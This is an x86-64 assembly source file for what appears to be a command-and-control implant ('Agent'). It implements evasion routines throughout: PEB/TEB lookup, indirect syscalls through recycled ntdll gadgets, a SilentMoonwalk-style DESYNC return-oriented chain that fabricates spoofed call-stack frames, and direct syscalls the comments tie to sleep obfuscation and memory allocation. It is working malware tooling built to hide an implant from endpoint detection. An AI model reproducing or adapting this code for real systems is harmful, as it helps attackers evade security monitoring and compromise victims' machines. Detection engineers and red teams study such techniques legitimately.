// __NAME__ Agent — x86-64 GAS assembly routines
//
// Ported from Plan9 ASM (ade/evasion) to AT&T syntax for MinGW-w64.
//
// Routines:
//   readGS60  — PEB pointer from GS:[0x60]
//   readGS30  — TEB pointer from GS:[0x30]
//   reCycall  — indirect syscall via recycled gadget (no spoofing)
//   reCycallDesync — DESYNC 4-frame spoofed indirect syscall
//   chSyscall5 — direct unspoofed SYSCALL (5 args)
//   smFixup   — DESYNC stack fixup (JMP [RBX] target)

.intel_syntax noprefix

.text

// ─── readGS60 — PEB ─────────────────────────────────────────────────────
// uintptr_t readGS60(void)
.globl readGS60
readGS60:
    mov     rax, gs:[0x60]
    ret

// ─── readGS30 — TEB ─────────────────────────────────────────────────────
// uintptr_t readGS30(void)
.globl readGS30
readGS30:
    mov     rax, gs:[0x30]
    ret

// ─── reCycall — indirect syscall via recycled gadget ─────────────────────
//
// uintptr_t reCycall(uint16_t ssn,       // RCX → AX
//                    uintptr_t gadget,   // RDX → R15
//                    uintptr_t arg1,     // R8  → RCX (first syscall arg)
//                    uintptr_t arg2,     // R9  → RDX (second syscall arg)
//                    uintptr_t arg3,     // [RSP+0x28]
//                    uintptr_t arg4)     // [RSP+0x30]
//
// Execution: MOV AX,ssn → R10=RCX → CALL R15 (→ syscall;ret in ntdll stub)
//
.globl reCycall
reCycall:
    // Save callee-saved registers
    push    rbx
    push    rbp
    push    r12
    push    r13
    push    r14
    push    r15

    // SSN → AX
    movzx   eax, cx

    // Gadget address → R15
    mov     r15, rdx

    // Shift args: arg1(R8) → RCX, arg2(R9) → RDX
    mov     rcx, r8
    mov     rdx, r9

    // arg3, arg4 from caller's shadow space
    // Caller had: RCX(ssn), RDX(gadget), R8(arg1), R9(arg2), [RSP+0x28](arg3), [RSP+0x30](arg4)
    // After 6 pushes: offsets shift by 48
    mov     r8,  [rsp + 0x28 + 48]    // arg3
    mov     r9,  [rsp + 0x30 + 48]    // arg4

    // R10 = RCX per Windows syscall ABI
    mov     r10, rcx

    // Allocate shadow space for callee
    sub     rsp, 0x28
    call    r15                         // → syscall;ret in ntdll
    add     rsp, 0x28

    // Restore callee-saved
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rbp
    pop     rbx
    ret

// ─── reCycall5 — indirect syscall via recycled gadget (5 args) ───────────
//
// uintptr_t reCycall5(uint16_t ssn, uintptr_t gadget,
//                     uintptr_t arg1, uintptr_t arg2,
//                     uintptr_t arg3, uintptr_t arg4,
//                     uintptr_t arg5)
//
.globl reCycall5
reCycall5:
    push    rbx
    push    rbp
    push    r12
    push    r13
    push    r14
    push    r15

    movzx   eax, cx
    mov     r15, rdx
    mov     rcx, r8
    mov     rdx, r9
    mov     r8,  [rsp + 0x28 + 48]
    mov     r9,  [rsp + 0x30 + 48]
    mov     r12, [rsp + 0x38 + 48]
    mov     r10, rcx

    sub     rsp, 0x30
    mov     [rsp + 0x20], r12
    call    r15
    add     rsp, 0x30

    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rbp
    pop     rbx
    ret

// ─── reCycall6 — indirect syscall via recycled gadget (6 args) ───────────
//
// uintptr_t reCycall6(uint16_t ssn, uintptr_t gadget,
//                     uintptr_t arg1, uintptr_t arg2,
//                     uintptr_t arg3, uintptr_t arg4,
//                     uintptr_t arg5, uintptr_t arg6)
//
.globl reCycall6
reCycall6:
    push    rbx
    push    rbp
    push    r12
    push    r13
    push    r14
    push    r15

    movzx   eax, cx
    mov     r15, rdx
    mov     rcx, r8
    mov     rdx, r9
    mov     r8,  [rsp + 0x28 + 48]
    mov     r9,  [rsp + 0x30 + 48]
    mov     r12, [rsp + 0x38 + 48]
    mov     r13, [rsp + 0x40 + 48]
    mov     r10, rcx

    sub     rsp, 0x38
    mov     [rsp + 0x20], r12
    mov     [rsp + 0x28], r13
    call    r15
    add     rsp, 0x38

    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rbp
    pop     rbx
    ret

// ─── reCycallDesync — SilentMoonwalk DESYNC 4-frame spoofed syscall ──────
//
// uintptr_t reCycallDesync(uint16_t ssn,         // RCX
//                          DesyncContext* ctx,    // RDX
//                          uintptr_t arg1,       // R8
//                          uintptr_t arg2,       // R9
//                          uintptr_t arg3,       // [RSP+0x28]
//                          uintptr_t arg4,       // [RSP+0x30]
//                          uintptr_t gadget)     // [RSP+0x38]
//
// DesyncContext offsets:
//   +0   FirstFrameAddr      +8   FirstFrameSize
//  +16   SecondFrameAddr    +24   SecondFrameSize
//  +32   JmpRbxGadget       +40   AddRspXGadget
//  +48   AddRspXValue       +56   JmpRbxFrameSize
//  +64   RbpPlantOffset
//
// Fake stack built top-down on real stack (matches ade/evasion reference):
//
//   HIGH (fakeStackTop)     ← R12 - 64, aligned 16
//     [fakeStackTop-8]      = FirstFrameRetAddr   (PUSH)
//     [.. -F1Size ..]       = FirstFrame body
//     [boundary]            = SecondFrameRetAddr
//     [.. -F2Size ..]       = SecondFrame body (RBP planted at RbpPlantOffset)
//     [boundary]            = JmpRbxGadget
//     [.. -(X+8) ..]       = dead zone
//     [bottom]              = AddRspXGadget        ← RSP set here
//   LOW
//
// ROP flow: JMP R15 → syscall;ret → RET pops AddRspXGadget
//           → ADD RSP,X;RET → RET pops JmpRbxGadget → JMP [RBX]
//           → reads [R12-8] = smFixup addr → jumps to smFixup
//           → restores RSP from R12, pops callee-saved, RET
//
.globl reCycallDesync
reCycallDesync:
    push    rbx
    push    rbp
    push    r12
    push    r13
    push    r14
    push    r15

    mov     r12, rsp                    // save real RSP (after 6 pushes)

    // ── Pre-save all syscall params BEFORE clobbering registers ──
    // Win64 ABI: RCX=ssn, RDX=ctx, R8=arg1, R9=arg2
    // Stack args (from R12): arg3=[R12+0x58], arg4=[R12+0x60], gadget=[R12+0x68]
    movzx   eax, cx                     // SSN → EAX
    mov     r14, rdx                    // DesyncContext* → R14
    mov     r13, r8                     // arg1 → R13
    mov     [r12 - 16], r9             // arg2 → scratch
    mov     rcx, [r12 + 0x58]          // arg3 from caller stack
    mov     [r12 - 24], rcx            // arg3 → scratch
    mov     rcx, [r12 + 0x60]          // arg4 from caller stack
    mov     [r12 - 32], rcx            // arg4 → scratch
    mov     r15, [r12 + 0x68]          // gadget → R15

    // Write smFixup address to [R12-8] for JMP [RBX] target
    lea     rcx, [rip + smFixup]
    mov     [r12 - 8], rcx

    // ── Pivot RSP to fakeStackTop (below scratch area, aligned) ──
    lea     rsp, [r12 - 64]
    and     rsp, -16

    // ── Build frames top-down (matching ade/evasion reference) ──

    // FirstFrame (bottom-most legit frame — highest stack address)
    mov     rcx, [r14]                  // +0: FirstFrameAddr
    push    rcx                         // push as bottom return address
    mov     rcx, [r14 + 8]             // +8: FirstFrameSize
    sub     rsp, rcx                    // allocate F1 body

    // SecondFrame boundary: write return addr at current RSP
    mov     rcx, [r14 + 16]            // +16: SecondFrameAddr
    mov     [rsp], rcx
    mov     rcx, [r14 + 24]            // +24: SecondFrameSize
    sub     rsp, rcx                    // allocate F2 body

    // Plant RBP in SecondFrame: [RSP + RbpPlantOffset] → F1 boundary
    mov     rcx, rsp
    add     rcx, [r14 + 24]            // rcx = RSP + F2Size = top of F2 = F1 boundary
    mov     rdx, [r14 + 64]            // +64: RbpPlantOffset
    mov     [rsp + rdx], rcx           // plant pointer to F1 boundary

    // JmpRbx return address at current RSP (F2/dead-zone boundary)
    mov     rcx, [r14 + 32]            // +32: JmpRbxGadget
    mov     [rsp], rcx

    // Allocate dead zone: AddRspXValue + 8 bytes
    mov     rcx, [r14 + 48]            // +48: AddRspXValue (X)
    add     rcx, 8
    sub     rsp, rcx

    // AddRspX "return address" at the very bottom
    mov     rcx, [r14 + 40]            // +40: AddRspXGadget
    mov     [rsp], rcx

    // ── RSP is now at the bottom of the fabricated stack ──

    // Set RBX = pointer to fixup address (stored at [R12-8])
    lea     rbx, [r12 - 8]

    // ── Load syscall args ──
    mov     rcx, r13                    // arg1
    mov     rdx, [r12 - 16]           // arg2
    mov     r8,  [r12 - 24]           // arg3
    mov     r9,  [r12 - 32]           // arg4

    // R10 = RCX per Windows syscall ABI
    mov     r10, rcx

    // SSN already in EAX
    // Jump to recycled syscall;ret gadget in ntdll — RIP stays in ntdll
    jmp     r15

    ud2                                 // unreachable

// smFixup — restore real RSP after DESYNC ROP chain completes.
// Reached via: syscall;ret → AddRspX → ADD RSP,X;RET → JmpRbx → JMP [RBX] → here
smFixup:
    mov     rsp, r12                    // restore original RSP
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rbp
    pop     rbx
    ret

// ─── chSyscall5 — direct unspoofed SYSCALL (5 args) ──────────────────────
//
// uintptr_t chSyscall5(uint16_t ssn,       // RCX
//                      uintptr_t arg1,     // RDX → RCX
//                      uintptr_t arg2,     // R8  → RDX
//                      uintptr_t arg3,     // R9  → R8
//                      uintptr_t arg4,     // [RSP+0x28] → R9
//                      uintptr_t arg5)     // [RSP+0x30] → stack
//
// Direct SYSCALL — no gadget, no spoofing. Useful for bootstrap calls
// during init or sleep obfuscation where DESYNC recursion must be avoided.
//
.globl chSyscall5
chSyscall5:
    push    rbx
    push    r12

    // SSN → EAX
    movzx   eax, cx

    // Shift args: RDX→RCX, R8→RDX, R9→R8
    mov     rcx, rdx
    mov     rdx, r8
    mov     r8,  r9

    // arg4 from stack (after 2 pushes = +16 offset)
    mov     r9,  [rsp + 0x28 + 16]

    // arg5 needs to go to stack for the syscall
    mov     r12, [rsp + 0x30 + 16]

    // R10 = RCX per Windows ABI
    mov     r10, rcx

    // Shadow space + 5th arg on stack
    sub     rsp, 0x30
    mov     [rsp + 0x28], r12           // 5th arg in standard position
    syscall
    add     rsp, 0x30

    pop     r12
    pop     rbx
    ret

// ─── chSyscall6 — direct unspoofed SYSCALL (6 args) ──────────────────────
//
// uintptr_t chSyscall6(uint16_t ssn,       // RCX
//                      uintptr_t arg1,     // RDX → RCX
//                      uintptr_t arg2,     // R8  → RDX
//                      uintptr_t arg3,     // R9  → R8
//                      uintptr_t arg4,     // [RSP+0x28] → R9
//                      uintptr_t arg5,     // [RSP+0x30] → [RSP+0x28]
//                      uintptr_t arg6)     // [RSP+0x38] → [RSP+0x30]
//
// Same as chSyscall5 but places a 6th parameter at [RSP+0x30] for the
// kernel.  Used by NtAllocateVirtualMemory which needs 6 args.
//
.globl chSyscall6
chSyscall6:
    push    rbx
    push    r12
    push    r13

    // SSN → EAX
    movzx   eax, cx

    // Shift args: RDX→RCX, R8→RDX, R9→R8
    mov     rcx, rdx
    mov     rdx, r8
    mov     r8,  r9

    // 3 pushes = 24 bytes offset
    mov     r9,  [rsp + 0x28 + 24]     // arg4 → R9
    mov     r12, [rsp + 0x30 + 24]     // arg5
    mov     r13, [rsp + 0x38 + 24]     // arg6

    // R10 = RCX per Windows ABI
    mov     r10, rcx

    // Shadow space + 5th and 6th args on stack
    sub     rsp, 0x38
    mov     [rsp + 0x28], r12           // arg5
    mov     [rsp + 0x30], r13           // arg6
    syscall
    add     rsp, 0x38

    pop     r13
    pop     r12
    pop     rbx
    ret
